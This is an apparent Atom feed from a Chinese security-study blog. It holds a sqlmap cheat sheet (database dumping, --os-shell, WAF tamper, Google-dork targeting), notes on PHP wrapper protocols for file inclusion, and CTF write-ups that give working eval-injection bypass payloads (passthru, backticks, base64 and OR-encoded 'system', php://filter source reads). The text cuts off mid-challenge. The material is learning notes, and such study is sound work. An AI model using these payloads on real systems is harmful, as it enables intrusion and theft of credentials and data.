    <content type="html"><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>同样windows下只能借助python启动，太麻烦了，我选择使用kali</p><h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h2><h3 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span><br></code></pre></td></tr></table></figure><h3 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2. 获取数据库信息"></a>2. 获取数据库信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span> --dbs<br></code></pre></td></tr></table></figure><h3 id="3-获取当前数据库"><a href="#3-获取当前数据库" class="headerlink" title="3. 获取当前数据库"></a>3. 获取当前数据库</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span> <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="常用参数详解"><a href="#常用参数详解" class="headerlink" title="常用参数详解"></a>常用参数详解</h2><table><thead><tr><th>参数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>​<code>-u</code>​</td><td>指定目标URL</td><td>​<code>-u &quot;http://example.com/page.php?id=1&quot;</code>​</td></tr><tr><td>​<code>--data</code>​</td><td>POST数据</td><td>​<code>--data=&quot;user=admin&amp;pass=123&quot;</code>​</td></tr><tr><td>​<code>--cookie</code>​</td><td>设置Cookie</td><td>​<code>--cookie=&quot;PHPSESSID=123&quot;</code>​</td></tr><tr><td>​<code>--level</code>​</td><td>测试等级(1-5)</td><td>​<code>--level=3</code>​</td></tr><tr><td>​<code>--risk</code>​</td><td>风险等级(1-3)</td><td>​<code>--risk=2</code>​</td></tr><tr><td>​<code>--dbs</code>​</td><td>枚举数据库</td><td>​<code>--dbs</code>​</td></tr><tr><td>​<code>-D</code>​</td><td>指定数据库</td><td>​<code>-D testdb</code>​</td></tr><tr><td>​<code>--tables</code>​</td><td>枚举表</td><td>​<code>--tables</code>​</td></tr><tr><td>​<code>-T</code>​</td><td>指定表</td><td>​<code>-T users</code>​</td></tr><tr><td>​<code>--columns</code>​</td><td>枚举列</td><td>​<code>--columns</code>​</td></tr><tr><td>​<code>-C</code>​</td><td>指定列</td><td>​<code>-C username,password</code>​</td></tr><tr><td>​<code>--dump</code>​</td><td>导出数据</td><td>​<code>--dump</code>​</td></tr><tr><td>​<code>--os-shell</code>​</td><td>获取操作系统shell</td><td>​<code>--os-shell</code>​</td></tr><tr><td>​<code>--proxy</code>​</td><td>使用代理</td><td>​<code>--proxy=&quot;http://127.0.0.1:8080&quot;</code>​</td></tr><tr><td>​<code>--threads</code>​</td><td>线程数</td><td>​<code>--threads=5</code>​</td></tr><tr><td>​<code>--batch</code>​</td><td>自动选择默认选项</td><td>​<code>--batch</code>​</td></tr></tbody></table><p>‍</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="1-POST请求注入"><a href="#1-POST请求注入" class="headerlink" title="1. POST请求注入"></a>1. POST请求注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/login.php&quot;</span> --data=<span class="hljs-string">&quot;username=admin&amp;password=123&quot;</span><br></code></pre></td></tr></table></figure><h3 id="2-使用Cookie"><a href="#2-使用Cookie" class="headerlink" title="2. 使用Cookie"></a>2. 使用Cookie</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/member.php&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=123456&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-指定数据库类型"><a href="#3-指定数据库类型" class="headerlink" title="3. 指定数据库类型"></a>3. 指定数据库类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span> --dbms=mysql<br></code></pre></td></tr></table></figure><h3 id="4-暴力破解表名"><a href="#4-暴力破解表名" class="headerlink" title="4. 暴力破解表名"></a>4. 暴力破解表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span> --common-tables<br></code></pre></td></tr></table></figure><h3 id="5-获取操作系统shell"><a href="#5-获取操作系统shell" class="headerlink" title="5. 获取操作系统shell"></a>5. 获取操作系统shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span> --os-shell<br></code></pre></td></tr></table></figure><h3 id="6-绕过WAF"><a href="#6-绕过WAF" class="headerlink" title="6. 绕过WAF"></a>6. 绕过WAF</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">&quot;http://example.com/page.php?id=1&quot;</span> <span class="hljs-attribute">--tamper</span>=space2comment<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><ol><li><strong>使用代理观察请求</strong>：</li></ol><ul><li><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot;<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span><span class="hljs-strong">**只检测不利用**</span>：<br><span class="hljs-bullet">- </span><span class="hljs-code">```bash</span><br><span class="hljs-code">  sqlmap -u &quot;http://example.com/page.php?id=1&quot; --batch --smart</span><br></code></pre></td></tr></table></figure></code></pre></li><li><strong>从Burp Suite日志导入</strong>：</li><li><pre><code class="language-bash">sqlmap -l burp.log<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span><span class="hljs-strong">**使用Google搜索结果测试**</span>：<br><br></code></pre></td></tr></table></figure>sqlmap -g &quot;inurl:.php?id=&quot;</code></pre></li></ul><pre><code class="hljs"></code></pre>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>在· Windows·操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::$DATA”来访问。<br>例如，”1.txt”是一个文件，而”1.txt:$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口</p><p>‍</p><p>‍</p><blockquote><p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">写入方法:(命令行)<br>echo·内容·&gt;&gt;文件名:数据流名<br>type· 文件名&gt;&gt;文件名:数据流名<br>查看方法:<br>notepad·文件名:数据流名</span></p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
    </categories>
    
    
    <tags>
      
      <tag>upload-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h1 id="一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客"><a href="#一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客" class="headerlink" title="一、前言【文件包含中的伪协议】_文件包含伪协议-CSDN博客"></a>一、前言<a href="https://blog.csdn.net/weixin_45131319/article/details/138420946?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=1">【文件包含中的伪协议】_文件包含伪协议-CSDN博客</a></h1><h2 id="1-什么是PHP伪协议？"><a href="#1-什么是PHP伪协议？" class="headerlink" title="1.什么是PHP伪协议？"></a>1.什么是PHP伪协议？</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。</p><p>有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。</p><p>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件<br>allow_url_include On&#x2F;Off 允许或禁止引用URL文件</p><p>‍</p><h2 id="2-什么时候用PHP伪协议"><a href="#2-什么时候用PHP伪协议" class="headerlink" title="2.什么时候用PHP伪协议?"></a>2.什么时候用PHP伪协议?</h2><p>文件包含！！！的时候，可能遇到的文件包含函数：<br>1、include<br>2、require<br>3、include_once<br>4、require_once<br>5、highlight_file<br>6、show_source<br>7、flie<br>8、readfile<br>9、file_get_contents<br>10、file_put_contents<br>11、fopen (比较常见)</p><p>‍</p><h1 id="二、常见的php伪协议"><a href="#二、常见的php伪协议" class="headerlink" title="二、常见的php伪协议"></a>二、常见的php伪协议</h1><p>php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流，获取POST请求数据的协议</p><p>当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p><p>php:&#x2F;&#x2F;input 伪协议 成功执行前提<br>php.ini 中的 allow_url_include设置为On</p><p>格式示例：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">php<br>&lt;?php<br>@<span class="hljs-built_in">include</span>($_GET[<span class="hljs-string">&quot;file&quot;</span>]);<br>?&gt;<br></code></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;filter<br>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出</p><p>php:&#x2F;&#x2F;filter 的使用：<br>如<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php</p><p>php:&#x2F;&#x2F;filter 伪协议组成：<br>read&#x3D;&lt;读链的筛选列表&gt;<br>resource&#x3D;&lt;要过滤的数据流&gt;<br>write&#x3D;&lt;写链的筛选列表&gt;<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件</p><p>read 对应要设置的过滤器：<br>常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器<br>其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器</p><p>格式示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?php<br>$a=($_GET[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-built_in">echo</span>(<span class="hljs-built_in">file_get_contents</span>($a));<span class="hljs-comment">//获取文件内容</span><br>?&gt;<br></code></pre></td></tr></table></figure><p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p><p>格式示例：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?php<br>$a=($_GET[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-built_in">include</span>($a);<br>?&gt;<br></code></pre></td></tr></table></figure><p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p><p>格式示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?php<br>$a=($_GET[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-built_in">include</span>($a);<br>?&gt;<br></code></pre></td></tr></table></figure><p>压缩及协议访问格式：</p><p>压缩文件为.zip后缀<br>zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php<br>压缩文件为.bz2后缀<br>compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php<br>压缩文件为.gz后缀<br>compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php</p><p>data:&#x2F;&#x2F;<br>data:&#x2F;&#x2F;伪协议可以通过请求提交的php代码数据配合文件包含函数可以达到代码执行效果。</p><p>data:&#x2F;&#x2F;伪协议 成功执行前提<br>php.ini设置allow_url_include 与allow_url_open都为On。</p><p>data:&#x2F;&#x2F;协议的格式是: data:&#x2F;&#x2F;数据流封装器,相应格式数据</p><p>格式示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?php<br>$a=($_GET[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-built_in">include</span>($a);<br>?&gt;<br></code></pre></td></tr></table></figure><h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F;伪协议可以对zip格式压缩包进行访问解析</p><p>格式示例：</p><blockquote><p>phar:&#x2F;&#x2F;绝对路径\phpinfo.zip\phpinfo.php</p></blockquote><p>注意这里与zip:&#x2F;&#x2F;不同的地方是，phar访问压缩包内容是通过&#x2F;访问，而zip是通过#访问</p><blockquote><p>使用这些伪协议时，需要注意PHP配置和服务器环境的限制，某些协议可能因为配置或安全原因被禁用。<br>特别是在处理外部资源（如HTTP或FTP）时，需要注意安全性，确保不会暴露敏感信息或遭受注入攻击。<br>在使用 data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等伪协议时，应特别注意数据的验证和清洁，以避免安全漏洞。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件包含</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI（模板注入）</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI（模板注入）"><a href="#SSTI（模板注入）" class="headerlink" title="SSTI（模板注入）"></a>SSTI（模板注入）</h1><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">待学习</a></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI</tag>
      
      <tag>模板注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>指令绕过</title>
    <link href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="指令绕过"><a href="#指令绕过" class="headerlink" title="指令绕过"></a>指令绕过</h1><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>只要满足正则表达式中的，这串代码将进行eval($c)，eval这个函数会将字符串当作php代码执行</p></blockquote><blockquote><p>方法一：?c&#x3D;system(‘cat config.php’);</p></blockquote><blockquote><p>方法二：?c&#x3D;echo shell_exec(‘cat config.php’);</p></blockquote><blockquote><p>方法三：?c&#x3D;highlight_file(‘config.php’);</p></blockquote><blockquote><p>方法四：?c&#x3D;echo shell_exec(‘sed -n p config.php’);</p></blockquote><blockquote><p>方法五：?c&#x3D;exec(‘cat config.php’, $output, $ret);echo ($output)[1];</p></blockquote><p>‍</p><h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>由于正则表达式改为不匹配了!preg_match，那么我们将不能用这三个函数，还可以用passthru这个函数，这个可以直接输出在浏览器上?c&#x3D;passthru(‘cat config.php’);,还有一个比较神奇的php为什么直接输出flag?c&#x3D;echo $flag;</p></blockquote><blockquote><p>方法一：</p><p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 因此可以构造linux命令输出config.php文件</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=echo `tac config.php`;<br></code></pre></td></tr></table></figure><p>tac命令倒序输出文件，在页面就能看到结果flag。 如果用cat命令，正序输出，因为被认为是PHP文件，所以需要在F12网络请求里看响应。还可以用这个函数得到内容c&#x3D;echo file_get_contents(‘config.php’);</p></blockquote><blockquote><p>方法二：php伪协议读取文件?c&#x3D;include(‘php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php’); 直接查看源码</p><p>?c=show_source(‘config.php’);</p></blockquote><blockquote><p>方法三：print_r();可以使用，?c=print_r(get_defined_vars()); 在数组中取出当前已定义的变量，本来是想传参到post绕过get的过滤机制system的，但是取出定义参数的时候，被定义好的flag参数也顺带被取出来了。</p></blockquote><blockquote><p>方法四：拼接绕过，限制函数system，构造?c=$a=‘sys’;$b=‘tem’;$d=$a.$b;$d(‘cat config.php’);</p></blockquote><blockquote><p>方法五：可以用get方式:?c=echo $_GET[1];&amp;1=tac config.php<br>可以用post方式:?c=echo $_POST[1];然后在Post data中写入1=tac config.php</p></blockquote><blockquote><p>方法六：使用或运算模式绕过限制，F12查看源码?c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%03%0f%0e%06%09%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%60%60%2e%60%60%60”);</p></blockquote><p>‍</p><h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>不难看出，这一次仅用了cat命令，‘.’和php还有config，那么我们就要想办法绕过才行，符号*有猜测的作用</p></blockquote><blockquote><p>可以用*符号来猜测补全不用完整的congfig和php，还有可以用tac不用cat就行，，system被禁用，老样子我们用passthru，还可以用print_r</p></blockquote><blockquote><p>另类的解题方法 根据报错获得路径信息&#x2F;var&#x2F;www&#x2F;html c&#x3D;$a&#x3D;opendir(%27&#x2F;var&#x2F;www&#x2F;html%27);$e&#x3D;readdir($a);$e&#x3D;readdir($a);$e&#x3D;readdir($a);echo%20readfile($e);</p></blockquote><blockquote><p>可以用base64编码来绕过c&#x3D;$a&#x3D;base64_decode(‘c3lzdGVt’);$b&#x3D;base64_decode(‘Y2F0IGNvbmZpZy5waHA&#x3D;’);$a($b);</p></blockquote><blockquote><p>cat 还有 less more head tac tali</p></blockquote><p>‍</p><h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in config.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cmd error&quot;</span>);<br>        &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>发现居然连分号都禁用了，php中?&gt;闭合了前面的<?，代表代码结束，因此最后一行是可以不需要分号的 ②?c=passthru('tac c*')?></p></blockquote><blockquote><p>通过伪协议获取 题目已经明确告知答案在config.php payload: &#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</p></blockquote><p>‍</p><h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 